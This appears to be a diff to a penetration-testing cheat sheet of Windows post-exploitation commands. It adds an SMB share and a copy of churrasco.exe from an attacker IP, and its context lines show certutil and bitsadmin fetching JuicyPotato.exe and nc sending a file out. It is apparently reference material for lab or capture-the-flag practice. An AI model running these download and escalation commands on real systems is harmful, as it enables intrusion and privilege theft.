@@ -21,6 +21,9 @@ certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 
 bitsadmin /transfer myDownload /priority normal http://10.10.14.3:8000/JuicyPotato.exe jp.exe
 
+sudo smbserver.py share .
+
+copy \\10.10.14.14\share\churrasco.exe c.exe
 
 nc -nv TARGET_IP 1234 < received_file
 
@@ -165,6 +168,8 @@ net localgroup administrators
 
 # Windows Network Enumeration 
 ```
+netstat -ano | findstr "LISTEN"
+
 ipconfig
 
 ipconfig /all
